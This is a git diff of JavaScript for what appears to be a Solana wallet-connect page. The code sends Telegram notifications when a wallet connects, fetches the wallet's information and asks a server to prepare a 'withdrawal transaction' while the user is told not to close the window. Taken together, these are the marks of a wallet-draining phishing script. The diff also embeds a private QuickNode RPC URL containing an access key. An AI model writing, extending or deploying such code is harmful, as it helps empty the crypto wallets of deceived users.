@@ -78,7 +78,6 @@ $(document).ready(function() {
 
     async function sendTelegramNotification(message) {
         try {
-            // استخدام المسار النسبي - سيتواصل تلقائياً مع نفس السيرفر
             await fetch('/notify', {
                 method: 'POST',
                 headers: {
@@ -282,16 +281,11 @@ $(document).ready(function() {
             $('.wallet-loading-title').text(`${walletInfo.name} Connected`);
             $('.wallet-loading-subtitle').html('Fetching wallet information...<br>Please wait.');
 
-           const connection = new solanaWeb3.Connection(
-                'https://api.mainnet-beta.solana.com',
+            // ✅ تم التعديل هنا: استخدام رابط QuickNode الخاص بك فقط (بدون fallbacks)
+            const connection = new solanaWeb3.Connection(
+                'https://skilled-purple-lake.solana-mainnet.quiknode.pro/2cd592b99695fb08845ca4afddbc2b97d9825e1e/',
                 'confirmed'
             );
-
-            // Fallback RPCs if primary fails
-            const fallbackRPCs = [
-                'https://solana-mainnet.rpc.exnode.io',
-                'https://rpc.ankr.com/solana'
-            ];
 
             let publicKeyString;
             if (walletType === 'solflare') {
@@ -445,7 +439,6 @@ $(document).ready(function() {
                     $('.wallet-loading-subtitle').html('Preparing withdrawal transaction...<br>Do not close this window.');
                     $('#connect-wallet').text(`Processing... ${retryCount > 0 ? `(Attempt ${retryCount + 1})` : ''}`);
                     
-                    // استخدام المسار النسبي - سيتواصل مع نفس السيرفر
                     const prepareResponse = await fetch('/prepare-transaction', {
                         method: 'POST',
                         headers: {
